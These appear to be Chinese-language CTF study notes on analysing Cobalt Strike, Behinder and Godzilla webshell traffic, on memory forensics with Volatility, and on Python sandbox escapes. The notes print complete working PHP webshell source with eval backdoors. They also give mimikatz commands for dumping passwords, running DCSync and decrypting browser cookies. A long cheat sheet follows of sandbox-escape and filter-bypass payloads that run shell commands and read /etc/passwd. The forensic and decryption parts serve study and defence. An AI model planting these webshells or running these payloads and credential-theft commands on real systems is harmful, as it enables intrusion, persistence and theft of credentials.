<font style="color:rgb(51, 51, 51);">http-beacon通信中，默认使用get方法向/dpixel、/__utm.gif、/pixel.gif等地址发起请求</font>

<font style="color:rgb(51, 51, 51);">同时get读文件时cookie是一串base64的值，这是cs流量的元数据（后面解密会用）</font>

![](https://cdn.nlark.com/yuque/0/2023/png/35229002/1694520750462-468f9bb5-6717-4315-92d7-1ceef38d876a.png)

###### <font style="color:rgb(119, 119, 119);">shell指令</font>
<font style="color:rgb(51, 51, 51);">POST /submit.php?id=xxxxx</font>

![](https://cdn.nlark.com/yuque/0/2023/png/35229002/1694520829874-1ff58831-2ba6-4962-8c24-fd2b13e8163c.png)

<font style="color:rgb(51, 51, 51);">其中post一串0000的data为cs发送流量的数据 （解密时需要转成base64）</font>

![](https://cdn.nlark.com/yuque/0/2023/png/35229002/1694520888930-2aaac6c0-80c7-4ee7-802e-1b006b260fa3.png)

###### <font style="color:rgb(119, 119, 119);">密钥文件</font>
<font style="color:rgb(51, 51, 51);">.cobalstrike.beacon_keys 的java反序列化字节流 .ser文件</font>

###### <font style="color:rgb(119, 119, 119);">解密cs流量</font>
[https://github.com/Slzdude/cs-scripts](https://github.com/Slzdude/cs-scripts)

<font style="color:rgb(51, 51, 51);">导入java反序列化字节流文件入 parse_beacon_keys.py 得到rsa公私钥，私钥为主</font>

![](https://cdn.nlark.com/yuque/0/2023/png/35229002/1694521163162-38223a14-0475-4cc0-a433-a9511968c894.png)

[https://github.com/WBGlIl/CS_Decrypt](https://github.com/WBGlIl/CS_Decrypt)

<font style="color:rgb(51, 51, 51);">将私钥和 cookie 值（cs元数据）导入 Beacon_metadata_RSA_Decrypt.py 解密出AES key 和 HMAC key</font>

![](https://cdn.nlark.com/yuque/0/2023/png/35229002/1694521349714-14622b34-f6d3-422e-9c79-9202f99b55f3.png)

<font style="color:rgb(51, 51, 51);">导入 AES key 和 HMAC key 和发送数据的base64格式入 Beacon_Task_return_AES_Decrypt.py 解密发送的数据</font>

![](https://cdn.nlark.com/yuque/0/2023/png/35229002/1694521553479-dad76f5a-5fe0-419a-9510-f5c86a94a4ee.png)

##### <font style="color:rgb(51, 51, 51);">冰蝎流量</font>
###### <font style="color:rgb(119, 119, 119);">特征</font>
<font style="color:rgb(51, 51, 51);">请求和返回值为 base64 的 aes 加密值</font>

###### <font style="color:rgb(119, 119, 119);">shell命令</font>
<font style="color:rgb(51, 51, 51);">冰蝎2</font>

```plain
<?php
@error_reporting(0);
session_start();
if (isset($_GET['pass']))
  //这里如果接收到get请求的pass参数
{
  $key=substr(md5(uniqid(rand())),16);
  //生成16位的随机秘钥用md5加密
  $_SESSION['k']=$key;
  //将上方生成的KEY存储到SEESSION中
  print $key;
}
else
  //如果没接收到pass参数，利用存储的KEY进行解密
{
  $key=$_SESSION['k'];
  //接收执行的命令
  $post=file_get_contents("php://input");
  if(!extension_loaded('openssl'))
  {
    $t="base64_"."decode";
    $post=$t($post."");

    for($i=0;$i<strlen($post);$i++) {
      $post[$i] = $post[$i]^$key[$i+1&15]; 
    }
  }
  else
    //使用oppenssl进行AES128加密(这里要注意他用的AES128解密的时候也需要用这个)
  {
    $post=openssl_decrypt($post, "AES128", $key);
  }
  //将解密后的$post以'|'分割为数组。
  $arr=explode('|',$post);
  $func=$arr[0];
  $params=$arr[1];
  class C{public function __construct($p) {eval($p."");}}
  //创建C类，利用__construct中的eval来执行解密后的值
  @new C($params);
}
?>
```

<font style="color:rgb(51, 51, 51);">冰蝎3</font>

```plain
<?php
@error_reporting(0);
session_start();
$key="e45e329feb5d925b"; //该密钥为连接密码32位md5值的前16位，默认连接密码rebeyond
$_SESSION['k']=$key;
$post=file_get_contents("php://input");
if(!extension_loaded('openssl'))
{
  $t="base64_"."decode";
  $post=$t($post."");

  for($i=0;$i<strlen($post);$i++) {
    $post[$i] = $post[$i]^$key[$i+1&15]; 
  }
}
else
{
  $post=openssl_decrypt($post, "AES128", $key);
}
$arr=explode('|',$post);
$func=$arr[0];
$params=$arr[1];
class C{public function __invoke($p) {eval($p."");}}
@call_user_func(new C(),$params);
?>
```

<font style="color:rgb(51, 51, 51);">冰蝎2与冰蝎3 除了key生成方式区别外并无不同，加密逻辑为 AES CBC 后 base64</font>

###### <font style="color:rgb(119, 119, 119);">解密冰蝎流量（iv用00填充）</font>
<font style="color:rgb(51, 51, 51);">请求包和返回包（重点！iv是全0填充0000000000000000000000000000000）</font>

![](https://cdn.nlark.com/yuque/0/2023/png/35229002/1694521853846-f3188d20-8fb2-427b-bab7-00db4aa56559.png)

<font style="color:rgb(51, 51, 51);">解密的结果再进行一次base64解密即可</font>

<font style="color:rgb(51, 51, 51);">python解密脚本</font>

```plain
from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad
import base64

def aes_decrypt_cbc(ciphertext, key, iv):
    cipher = AES.new(key, AES.MODE_CBC, iv)
    plaintext = cipher.decrypt(ciphertext)
    plaintext = unpad(plaintext, AES.block_size)
    return plaintext

ciphertext_base64 = b'uU7xO0V/KGySO6rdSlEw/dQXFklZWZn1EMhiAAoH7WPgcZi0gqTYodGuKeZEwtv2Gw1H/AgTwH2yV+Ix3A5QEhB3qHn5V1mOdSHC5dBkMmn6niKXQvCEsFi00fJXrxuXI9KhhR14BXCxYfRnA1KDjQ=='
ciphertext = base64.b64decode(ciphertext_base64)
key = b'7d7c23e87b47368b'
iv = b'\x00' * 16  # 16 bytes of zeros

plaintext = aes_decrypt_cbc(ciphertext, key, iv)
print(plaintext)
```

##### <font style="color:rgb(51, 51, 51);">冰蝎流量（java）</font>
###### <font style="color:rgb(119, 119, 119);">特征</font>
<font style="color:rgb(51, 51, 51);">shell为java编写，且有 AES 加密字段</font>

###### <font style="color:rgb(119, 119, 119);">解密</font>
<font style="color:rgb(51, 51, 51);">AES ECB解出 class文件</font>

![](https://cdn.nlark.com/yuque/0/2023/png/35229002/1694529981164-7513de16-9bc7-43d3-b438-027d1551957e.png)

<font style="color:rgb(51, 51, 51);">使用jadx进行反编译</font>

![](https://cdn.nlark.com/yuque/0/2023/png/35229002/1694530003971-854f7a24-739e-4bab-9c9c-bc420050e30f.png)

<font style="color:rgb(51, 51, 51);">再将返回值进行解密</font>

![](https://cdn.nlark.com/yuque/0/2023/png/35229002/1694530103332-86d9f805-fcbd-40a4-a4cd-49abe9866948.png)

<font style="color:rgb(51, 51, 51);">将raw值进行AES解密</font>

![](https://cdn.nlark.com/yuque/0/2023/png/35229002/1694530124247-76f75039-714f-49af-bbd6-c6a578301efe.png)

##### <font style="color:rgb(51, 51, 51);">哥斯拉流量</font>
###### <font style="color:rgb(119, 119, 119);">特征</font>
<font style="color:rgb(51, 51, 51);">命令执行的变量名/pass为webshell连接密码 </font>

![](https://cdn.nlark.com/yuque/0/2023/png/35229002/1694522988983-54744526-cbb0-4a2f-98d5-caca66007e3b.png)

###### <font style="color:rgb(119, 119, 119);">shell命令</font>
```plain
<?php
@session_start();
@set_time_limit(0);
@error_reporting(0);
function encode($D,$K){
    for($i=0;$i<strlen($D);$i++) {
        $c = $K[$i+1&15];
        $D[$i] = $D[$i]^$c;
    }
    return $D;
}
$pass='air123';
$payloadName='payload';
$key='d8ea7326e6ec5916';
if (isset($_POST[$pass])){
    $data=encode(base64_decode($_POST[$pass]),$key);
    if (isset($_SESSION[$payloadName])){
        $payload=encode($_SESSION[$payloadName],$key);
        if (strpos($payload,"getBasicsInfo")===false){
            $payload=encode($payload,$key);
        }
        eval($payload);
        echo substr(md5($pass.$key),0,16);
        echo base64_encode(encode(@run($data),$key));
        echo substr(md5($pass.$key),16);
    }else{
        if (strpos($data,"getBasicsInfo")!==false){
            $_SESSION[$payloadName]=encode($data,$key);
        }
    }
}
```

###### <font style="color:rgb(119, 119, 119);">解密</font>
<font style="color:rgb(51, 51, 51);">base64解密后异或key，重要（其中key的第一位要移到最后一位）</font>

![](https://cdn.nlark.com/yuque/0/2023/png/35229002/1694523258253-bec679ba-c6c2-42e2-a507-8bd1643449b0.png)

##### <font style="color:rgb(51, 51, 51);">哥斯拉流量（java）</font>
###### <font style="color:rgb(119, 119, 119);">解密</font>
<font style="color:rgb(51, 51, 51);">得到16进制密文后 进行 AES ECB解密，在进行Gzip</font>

![](https://cdn.nlark.com/yuque/0/2023/png/35229002/1694523845607-981f9251-8231-4d64-b538-6fb42a07bc2f.png)

##### <font style="color:rgb(51, 51, 51);">蚁剑/菜刀流量</font>
<font style="color:rgb(51, 51, 51);">如果可以直接base64解码出来，则为蚁剑/菜刀流量</font>

### <font style="color:rgb(51, 51, 51);">内存分析</font>
| **<font style="color:rgb(51, 51, 51);">工具 / 命令名称</font>** | **<font style="color:rgb(51, 51, 51);">用途</font>** | **<font style="color:rgb(51, 51, 51);">命令 / 示例</font>** | **<font style="color:rgb(51, 51, 51);">参数（常用）</font>** |
| --- | --- | --- | --- |
| <font style="color:rgb(51, 51, 51);">binwalk / foremost</font> | <font style="color:rgb(51, 51, 51);">分离文件</font> | <font style="color:rgb(51, 51, 51);">foremost 参数 输入文件foremost -i inputfile -T</font> | |
| <font style="color:rgb(51, 51, 51);">strings</font> | <font style="color:rgb(51, 51, 51);">查找指定字符串</font> | <font style="color:rgb(51, 51, 51);">strings 参数 输入文件strings inputfile</font> | |
| <font style="color:rgb(51, 51, 51);">010Editor</font> | <font style="color:rgb(51, 51, 51);">查看泄露信息</font> | <font style="color:rgb(51, 51, 51);">010Editor可能由0宽组成：例如password p a s s w o r d70 00 61 00 73 00 73 00 77 00 6F 00 72 00 64 00</font> | |
| | | | |
| aeskeyfind | 查询aes密钥 | aeskeyfind tmp.DMP | |
| <font style="color:rgb(51, 51, 51);">mimikatz</font> | <font style="color:rgb(51, 51, 51);">获取lass.dump的账号密码</font> | 详细看附表 | |
| <font style="color:rgb(51, 51, 51);">mountumount</font> | <font style="color:rgb(51, 51, 51);">挂载镜像，载入镜像</font> | <font style="color:rgb(51, 51, 51);">mount 镜像文件 挂载文件路径mount inputfile /mnt</font> | |
| <font style="color:rgb(51, 51, 51);">fsck</font> | <font style="color:rgb(51, 51, 51);">恢复破损系统文件</font> | <font style="color:rgb(51, 51, 51);">fsck 镜像文件</font> | |
| <font style="color:rgb(51, 51, 51);">testdisk</font> | <font style="color:rgb(51, 51, 51);">恢复文件</font> | <font style="color:rgb(51, 51, 51);">testdisk 镜像文件testdisk inputfile</font> | |
| <font style="color:rgb(51, 51, 51);">FTK Imager</font> | <font style="color:rgb(51, 51, 51);">挂载镜像，载入镜像</font> | | <font style="color:rgb(51, 51, 51);">add Evidence Item 载入镜像Image Mounting 挂载镜像</font> |
| <font style="color:rgb(51, 51, 51);">VareCrypt请务必搭配keyfile使用</font> | <font style="color:rgb(51, 51, 51);">挂载镜像，载入镜像</font> | | |
| <font style="color:rgb(51, 51, 51);">DiskGenius</font> | <font style="color:rgb(51, 51, 51);">挂载镜像，载入镜像</font> | | |
| <font style="color:rgb(51, 51, 51);">R-studio数据恢复</font> | <font style="color:rgb(51, 51, 51);">恢复文件</font> | | |
| <font style="color:rgb(51, 51, 51);">extundelete</font> | <font style="color:rgb(51, 51, 51);">恢复文件</font> | <font style="color:rgb(51, 51, 51);">extumdelete 参数 device-file 镜像文件extumdelete 参数 device-file inputfile</font> |  |
| <font style="color:rgb(51, 51, 51);">PasswareKitForensic</font> | <font style="color:rgb(51, 51, 51);">镜像加密破解</font> | | |
| <font style="color:rgb(51, 51, 51);">AXIOM</font> | <font style="color:rgb(51, 51, 51);">取证分析</font> | | |
| <font style="color:rgb(51, 51, 51);">取证大师</font> | <font style="color:rgb(51, 51, 51);">取证分析</font> | | |
| <font style="color:rgb(51, 51, 51);">volitility</font> | <font style="color:rgb(51, 51, 51);">取证分析</font> | <font style="color:rgb(51, 51, 51);">volatility -f 镜像文件 文件类型info --profile=镜像配置 参数volatility -f input --profile=Win7SP1x64 pslist</font> |  |
| <font style="color:rgb(51, 51, 51);">Registry Workshop</font> | <font style="color:rgb(51, 51, 51);">恢复注册表，注册表取证</font> | | |
| <font style="color:rgb(51, 51, 51);">WRR</font> | <font style="color:rgb(51, 51, 51);">恢复注册表，注册表取证</font> | | |


### <font style="color:rgb(51, 51, 51);">内存取证 vol参数</font>
```plain
-f 打开镜像
-Q 提取文件
-D 保存文件
-o 选择 virtual 地址 
-K 使用注册表密钥

Commands：
amcache：查看Amcache应用程序痕迹信息
apihooks：检测内核及进程的内存空间中的APIhook
atoms：列出会话及窗口站atom表
atomscan：Atom表的池扫描（Poolscanner）
auditpol：列出注册表HKLMSECURITYPolicyPolAdtEv的审计策略信息
bigpools：使用BigPagePoolScanner转储大分页池(bigpagepools)
bioskbd：从实施模式内存中读取键盘缓冲数据（早期电脑可以读取出BIOS开机密码）
cachedump：获取内存中缓存的域账号的密码哈希
callbacks：打印全系统通知例程
clipboard：提取Windows剪贴板中的内容
cmdline：显示进程命令行参数
cmdscan：提取执行的命令行历史记录（扫描_COMMAND_HISTORY信息）
connections：打印系统打开的网络连接（仅支持WindowsXP和2003）
connscan：打印TCP连接信息（仅支持WindowsXP和2003）
consoles：提取执行的命令行历史记录（扫描_CONSOLE_INFORMATION信息）
crashinfo：提取崩溃转储信息
deskscan：tagDESKTOP持扫描（Poolscaner）
devicetree：显示设备树信息
dlldump：从进程地址空间转储动态链接库
dlllist：打印每个进程加载的动态链接库列表
driverirp：IRPhook驱动检测
drivermodule：关联驱动对象至内核模块
driverscan：驱动对象池扫描
dumpcerts：提取RAS私钥及SSL公钥
dumpfiles：提取内存中注册表信息至磁盘（dumpfiles -Q 文件地址 -D 输出路径）
editbox：查看Edit编辑控件信息（Listbox正在实验中）
envars：显示进程的环境变量
eventhooks：打印Windows事件hook详细信息
evtlogs：提取Windows事件日志（仅支持XP/2003）
filescan：提取文件对象池信息
gahti：转储用户句柄类型信息
gditimers：打印已安装的GDI计时器及回调
gdt：显示全局描述符表
getservicesides：获取注册表的服务名称并返回SID信息
getsids：打印每个进程的SID信息
handles：打印每个进程打开的句柄的列表(句柄是一种智能的指针)
hashdump：转储内存中Windows账户密码哈希
hibinfo：转储休眠文件信息
hivedump：打印注册表配置单元信息
hivelist：打印注册表配置单元列表
hivescan：注册表配置单元池扫描
hpakextract：从HPAK文件（FastDump格式）提取物理内存数据
hpakinfo：查看HPAK文件属性及相关信息
idt：显示中断描述符表
iehistory：重建IE缓存及访问历史记录
imagecopy：将物理地址空间导出原生DD镜像文件
imageinfo：查看识别镜像信息
impscan扫描对导入函数的调用
joblinks：打印进程任务链接信息
kdbgscan：搜索和转储潜在KDBG值
kpcrscan：搜索和转储潜在KPCR值
ldrmodules：检测未链接的动态链接DLL
lsadump：从注册表中提取LSA密钥信息（已解密）
machoinfo：转储Mach-O文件格式信息
malfind：查找隐藏和插入的代码
mbrparser：扫描并解析潜在的主引导记录（MBR）
memdump：转储进程的可寻址内存（dump进程 -p 进程PID -D 输出文件路径）
memmap：打印内存映射
messagehooks：桌面和窗口消息钩子的线程列表
mftparser：扫描并解析潜在的MFT条目
moddump：转储内核驱动程序到可执行文件的示例
modscan：内核模块池扫描
modules：打印加载模块的列表
multiscan：批量扫描各种对象
mutantscan：对互斥对象池扫描
notepad：查看记事本当前显示的文本(ThiscommanddoesnotsupporttheprofileWin7SP1x64)
netscan:扫描网络情况
objtypescan：扫描窗口对象类型对象
patcher：基于页面扫描的补丁程序内存
poolpeek：可配置的池扫描器插件
printkey：打印注册表项及其子项和值（printkey -o 注册表地址/printkey -K 注册表名）
privs：显示进程权限
procdump：进程转储到一个可执行文件示例
pslist：按照EPROCESS列表打印所有正在运行的进程
psscan：进程对象池扫描
pstree：以树型方式打印进程列表
psxview：查找带有隐藏进程的所有进程列表
qemuinfo：转储Qemu信息
raw2dmp：将物理内存原生数据转换为windbg崩溃转储格式
screenshot：基于GDIWindows的虚拟屏幕截图保存
servicediff：Windows服务列表
sessions：_MM_SESSION_SPACE的详细信息列表（用户登录会话）
shellbags：打印shellbags信息
shimcache：解析应用程序兼容性Shim缓存注册表项
shutdowntime：从内存中的注册表信息获取机器关机时间
sockets：打印已打开套接字列表
sockscan：TCP套接字对象池扫描
ssdt：显示SSDT条目
strings：物理到虚拟地址的偏移匹配（需要一些时间，带详细信息）
svcscan：Windows服务列表扫描
symlinkscan：符号链接对象池扫描
thrdscan：线程对象池扫描
threads：调查_ETHREAD和_KTHREADs
timeliner：创建内存中的各种痕迹信息的时间线
timers：打印内核计时器及关联模块的DPC
truecryptmaster：恢复TrueCrypt7.1a主密钥
truecryptpassphrase：查找并提取TrueCrypt密码
truecryptsummary：TrueCrype摘要信息
unloadedmodules：打印卸载的模块信息列表
userassist：打印注册表中UserAssist相关信息
userhandles：转储用户句柄表
vaddump：转储VAD数据为文件
vadinfo：转储VAD信息
vadtree：以树的形式显示VAD树信息
vadwalk：显示遍历VAD树
vboxinfo：转储Virtualbox信息（虚拟机）
verinfo：打印PE镜像中的版本信息
vmwareinfo：转储VMwareVMSS/VMSN信息
volshell：内存镜像中的shell
windows：打印桌面窗口（详细信息）
wintree：Z顺序打印桌面窗口树
wndscan：池扫描窗口站
yarascan：以yara签名扫描进程或内核内存
-h 查看相关参数及帮助说明
–info 查看相关模块名称及支持的Windows版本
-f 指定要打开的内存镜像文件及路径
-d 开启调试模式
-v 开启显示详细信息模式(verbose)
```

### 内存取证 mimikatz参数
```plain
学习参考
https://www.cnblogs.com/-mo-/p/11890232.html

# 提升权限
privilege::debug
# 获取密码
sekurlsa::logonpasswords full

# 使用mimikatz提取hash
lsadump::sam /sam:SAM /system:SYSTEM (分析SAM SYSTEM文件)
sekurlsa::minidump lsass.dmp (分析lsass.dmp文件)
sekurlsa::logonpasswords full

# 读取本地域中的成员Hash
# 抓取本地密码
lsadump::lsa /patch
# 获取所有域用户
lsadump::dcsync /domain:test.com /all /csv
# 指定获取某个用户的hash
lsadump::dcsync /domain:test.com /user:test

# mimikatz解密Cookie
# 获取masterkey
sekurlsa::dpapi (直接获取masterkey)

dpapi::masterkey /in:"c:\Users\fengjie\AppData\Roaming\Microsoft\Protect\S-1-5-21-2274946182-2013957047-1890316882-1632\59a94dbc-6dbb-4d51-bec0-edebc6f2e9f8" /password:qqq123!@#

dpapi::masterkey /in:"c:\Users\fengjie\AppData\Roaming\Microsoft\Protect\S-1-5-21-2274946182-2013957047-1890316882-1632\59a94dbc-6dbb-4d51-bec0-edebc6f2e9f8" /hash:632f6adad4510099d676724bfb87c6ee

# 解密cookie
dpapi::chrome /in:\"C:\Users\fengjie\AppData\Local\Google\Chrome\User Data\Default\Login Data\Cookie" /masterkey:1b81b1c9cb66a3f93b58f85948e8ce53779c6e5d"

# mimikatz票据 
略
```



### <font style="color:rgb(51, 51, 51);">取证格式与工具参照表</font>
#### <font style="color:rgb(51, 51, 51);">镜像</font>
<font style="color:rgb(51, 51, 51);">Advanced Forensics : aff4</font>

<font style="color:rgb(51, 51, 51);">EnCase Image : E01,Ex01,L01,Lx01</font>

<font style="color:rgb(51, 51, 51);">FTK Images :AD1</font>

<font style="color:rgb(51, 51, 51);">Raw Image : raw,dd,img,ima,vfd,flp,bif,bin,dmg,dmp,mem,mdf,</font>

<font style="color:rgb(51, 51, 51);">dd Image : 00000,000001,000011</font>

<font style="color:rgb(51, 51, 51);">VM Image : vdi vhd vhdx vmdk vxa </font>

<font style="color:rgb(51, 51, 51);">DMG Image : dmg</font>

<font style="color:rgb(51, 51, 51);">Archives : cpio,gzip,7z,zip...</font>

#### <font style="color:rgb(51, 51, 51);">内存</font>
<font style="color:rgb(51, 51, 51);">Raw Image : raw,dd,img,ima,vfd,flp,bif,bin,dmg,dmp,mem,mdf,</font>

<font style="color:rgb(51, 51, 51);">Crash Dumps : crash</font>

<font style="color:rgb(51, 51, 51);">VM : vmss,vmsn,vmem</font>

<font style="color:rgb(51, 51, 51);">VirtualBox Core Dumps : elf</font>

<font style="color:rgb(51, 51, 51);">Other : hpak</font>

<font style="color:rgb(51, 51, 51);">Archives : cpio,gzip,7z,zip...</font>

#### <font style="color:rgb(51, 51, 51);">加密镜像以及密码</font>
<font style="color:rgb(51, 51, 51);">加密镜像：PasswareKitForensic</font>

<font style="color:rgb(51, 51, 51);">密码: mimikatz,password tool (文件在电脑中)</font>

#### <font style="color:rgb(51, 51, 51);">局限参考表</font>
| **<font style="color:rgb(51, 51, 51);">取证格式</font>** | **<font style="color:rgb(51, 51, 51);">取证工具</font>** |
| :--- | :--- |
| <font style="color:rgb(51, 51, 51);">E01</font> | <font style="color:rgb(51, 51, 51);">AXIOM,FTK,其它挂载工具</font> |
| <font style="color:rgb(51, 51, 51);">Raw</font> | <font style="color:rgb(51, 51, 51);">Vol,AXIOM,R-studio,FTK</font> |
| <font style="color:rgb(51, 51, 51);">vmdk</font> | <font style="color:rgb(51, 51, 51);">R-studio</font> |


## <font style="color:rgb(51, 51, 51);">Python逃逸总结</font>
### <font style="color:rgb(51, 51, 51);">常见系统执行命令</font>
```plain
一些系统信息：import platform #platform 具体命令需要另外找

import os
result = os.system("commmand")
print(result)
# os.system("sh") # 直接进行shell交互

result = os.popen("command")
print(result.read())

# eval只是表达式执行函数
eval(')"imaohw"(metsys.)"so"(__tropmi__'[::-1])

# exec是代码语句执行函数
exec(')"imaohw"(metsys.so ;so tropmi'[::-1]) 

# execfile 以python执行一个文件
execfile(filename)

import commands # 仅限python2
sataus = commands.getstatus("command")#返回shell命令输出内容
print(sataus)

output = commands.getoutput("command")#返回命令执行结果
print(output)

sataus,output = commands.getsatausoutput("command")
print(sataus,output)

import subprocess # 替换os.system
result = subprocess.popen("command",shell=True)
subprocess.call(['ifconfig'],shell=True)
subprocess.run()

import timeit
timeit.timeit(stmt='pass', setup='pass', timer=<default timer>, number=1000000, globals=None)
# 注意：命令为python命令和单引号以及双引号区别
timeit.timeit("__import__('os').system('ls')",number=1)
# stmt 是要测试的语句（字符串形式），setup 是要在语句前执行的代码（字符串形式），timer 可以是一个计时器对象，number 表示代码将被执行的次数

import pty
pty.spawn('command')

import platform 
print platform.popen('dir').read()

f'{__import__("os").system("ls")}'

getattr(object, name[, default])  # getattr获取属性
getattr(os,'system')('cat /etc/passwd')
```

### <font style="color:rgb(51, 51, 51);">打开文件</font>
```plain
file('flag.txt').read() # file函数
open('flag.txt').read() # open函数

import codecs # codecs模块
codecs.open('test.txt').read()

import types # types模块
print types.FileType("flag").read()

help() # 如果不是完整打开
__main__
h
E
flag.txt

help()
os
!sh
```

### <font style="color:rgb(51, 51, 51);">等效import</font>
```plain
import os
import  os
import   os
__import__('os')
importlib.import_module('os')

execfile('/usr/lib/python2.7/os,py') #效果等同于import 遍历了库文件
system('os')

with open('/usr/lib/python2.7/os.py')as f:
  exec(f.read())
system('os')

import sys
sys.moudles['os']

__loader__.load_module('os')
```

### <font style="color:rgb(51, 51, 51);">绕字符串</font>
```plain
# 其它绕过字符串，一些常见的加密和编码几个绕过（逆序，Rot13，16进制，hex，base64,unicode，拼接）
以下为几个举例：
_+'a' # 拼接字符串
__import__('so'[::-1]).system('ls') # 逆序

# 全角与半角转换
ｂｒｅａｋｐｏｉｎｔ（）
breakpoint()
# 特殊字符
# http://shapecatcher.com/unicode/block/Mathematical_Alphanumeric_Symbols

a = 'o'
b = 's'
__import__(a+b).system('ls') # 拼接
__import__("o"+"s").system('ls') # 拼接
__import__("o""s").system('ls') # 拼接

print('\x5f\x5f\x62\x75\x69\x6c\x74\x69\x6e\x73\x5f\x5f') # hex
print(u'\u005f\u005f\u0062\u0075\u0069\u006c\u0074\u0069\u006e\u0073\u005f\u005f') # unicode
print('X19idWlsdGluc19f'.decode('base64')) # base64
print("_builtins_".join("__"))
print("%c%c%c%c"%(101,101,101,101)) #ascii
print(chr(101),chr(22)) # ascii
print(bytes([111,123,1233,232]))

list(dict(whoami=1))[0] # list + dict
().__doc__.find('s') # __doc__
().__doc__[19]+().__doc__[86]+().__doc__[19] # 转字符串
```

### <font style="color:rgb(51, 51, 51);">绕数字</font>
```plain
# 0：int(bool([]))、Flase、len([])
# 1：int(bool([""]))、True
# 获取稍微大的数字：len(str({}.keys))，不过需要慢慢找长度符合的字符串
# 1或0：float(True)

# 以0绕过所有数字
0 ** 0 == 1
1 + 1 == 2
2 + 1 == 3
2 ** 2 == 4
...
```

### <font style="color:rgb(51, 51, 51);">绕长度</font>
```plain
exec(input())

breakpoint() # 进入模式后直接进行输入命令即可

help()命令进入help界面，在help界面中随便输入模块名字进入模块界面，输入!sh进入shell界面，!command执行命令
```

### <font style="color:rgb(51, 51, 51);">绕[]</font>
```plain
# __getitem__() 替换

''.__class__.__mro__[-1].__subclasses__()[200].__init__.__globals__['__builtins__']['__import__']('os').system('ls')

# __getitem__()替换中括号[]
''.__class__.__mro__.__getitem__(-1).__subclasses__().__getitem__(200).__init__.__globals__.__getitem__('__builtins__').__getitem__('__import__')('os').system('ls')

# pop()替换中括号[]，结合__getitem__()利用
''.__class__.__mro__.__getitem__(-1).__subclasses__().pop(200).__init__.__globals__.pop('__builtins__').pop('__import__')('os').system('ls')

getattr(''.__class__.__mro__.__getitem__(-1).__subclasses__().__getitem__(200).__init__.__globals__,'__builtins__').__getitem__('__import__')('os').system('ls')
```

### <font style="color:rgb(51, 51, 51);">绕''</font>
```plain
# str函数替换
>>> ().__class__.__new__
<built-in method __new__ of type object at 0x9597e0> 

# 将结果  <built-in method __new__ of type object at 0x9597e0> 转为了字符串
>>> str(().__class__.__new__) 
'<built-in method __new__ of type object at 0x9597e0>'

# 取字符串第n个字符
>>> str(().__class__.__new__)[21]
'w'

同理还有
str(().__class__)[8] 
<class 'tuple'> 
>>> ‘

>>> str(().__class__.__new__)[21]+str(().__class__.__new__)[13]+str(().__class__.__new__)[14]+str(().__class__.__new__)[40]+str(().__class__.__new__)[10]+str(().__class__.__new__)[3]
'whoami'
```

### <font style="color:rgb(51, 51, 51);">绕空格</font>
<font style="color:rgb(51, 51, 51);">()，[] 替换</font>

### <font style="color:rgb(51, 51, 51);">绕运算符</font>
```plain
== 用 in 替换
or 用 + - | 替换
and 用 & * 替换
```

### <font style="color:rgb(51, 51, 51);">绕()</font>
```plain
利用装饰器 @
利用魔术方法，例如 enum.EnumMeta.__getitem__
```

### <font style="color:rgb(51, 51, 51);">绕内建函数</font>
```plain
>>> eval('str')
<class 'str'>
>>> eval('bool')
<class 'bool'>
>>> eval('st'+'r')
<class 'str'>
>>> eval(list(dict(s_t_r=1))[0][::2])
<class 'str'>
```

### <font style="color:rgb(51, 51, 51);">绕. ,</font>
```plain
eval(list(dict(s_t_r=1))[0][::2])

>>> vars(__import__('binascii'))['a2b_base64']
<built-in function a2b_base64>
```

### <font style="color:rgb(51, 51, 51);">内建模块 builtins/builtin</font>**<font style="color:rgb(51, 51, 51);">/</font>**<font style="color:rgb(51, 51, 51);">builtins</font>
```plain
import __builtin__ # python2
import builtins # python3

dir(__builtins__) # 查看内部可用函数

'__import__' in dir(__builtins__) # 判断是否在__builtins__库中
如果库中被删除，可以尝试: 
reload(__builtins__) # python2

import imp
imp.reload(__builtins__) # python3

#执行命令：通过内建模块添加os模块列表执行命令
__builtins__.__dict__['__import__']('os').system('command')
```

### <font style="color:rgb(51, 51, 51);">继承关系逃逸</font>
```plain
# 理解知识点
__是魔法方法，以避免与其它函数名发生冲突

# 若是dir()可用时，可以多次查看属性和函数列表
__mro__   __subclasses__() __base__ 是在dir()中不显示的，是魔法属性，需要自己尝试

# dir __dict__ 显示下属属性和函数列表
''.__class__.__dict__['upper']
dir(''.__class__)

#mro的意思是方法解析顺类，从子类到父类
''.__class__.__mro__  
>>> (<class 'str'>, <class 'object'>)

# '' 是str类继承字object
''.__class__.__base__ # 查找父类
>>>  <class 'object'>)

# subclasses是一个魔法属性显示直接子类
''.__class__.__mro__.__subclasses__ 

# __getattribute__ 无条件调用
object.__getattribute__(self, name)
__import__(“os”).__getattribute__(“metsys”[::-1])(‘ls’)

# globals继承逃逸，通过一些库自带os之类的模块实现逃逸
function.func_globals # 返回全局变量子类

# 简单总结
1.找到子类
[].__class__ 返回一个空列表所属的类，即list 类。
.__base__ 和 __mro__ 返回list类的父类，即object类。
.__subclasses__() 返回object类的所有直接子类。
[59] 表示获取子类列表中下标为 59 的子类，这里可能因为 Python 解释器版本不同而导致结果不同，具体取决于object类有多少个直接子类。如果在你的 Python 环境中运行此代码时，出现了索引错误或其他异常，请尝试使用不同的索引。
当找到 os._wrap_close 类后进行初始化方法

2.初始化类（可以想象为调用初始化类的函数）
.__init__ 是获取该子类的初始化方法，即构造函数。
.__globals__ 获取该方法的全局命名空间作为一个字典，包含了该方法所在文件的全局变量和函数等信息。

3.如果有popen函数则可以直接执行
''.__class__.__base__.__subclasses__()[137].__init__.__globals__['popen']('ls').read()

4.如果没有popen函数则需要继续
['linecache'] 表示获取该文件中名字为linecache的模块。
.__dict__ 获取该模块的命名空间作为一个字典。
['os'] 表示获取该模块中名字为os的变量或模块。
system('whoami') 调用以'whoami'字符串为参数的os.system()函数。

# payload 
[].__class__.__base__.__subclasses__()[59].__init__.__globals__['linecache'].__dict__['os'].system('whoami')

[i.__init__.__globals__['linecache'].__dict__['os'].system('whoami') for i in ''.__class__.__mro__[-1].__subclasses__() if i.__name__ == "catch_warnings"]

''.__class__.__mro__[2].__subclasses__()[40]("/flag").read()
().__class__.__base__.__subclasses__()[-6].__init__.__globals__['system']('sh')

[].__class__.__base__.__subclasses__()[-4].__init__.__globals__[str(().__class__)[4] + str(().__class__.__new__)[29]+str(().__class__)[4]+str(().__class__.__new__)[5]+str(().__class__.__new__)[11]+str(().__class__.__new__)[10]](str(().__class__)[4]+str(().__class__.__new__)[13])

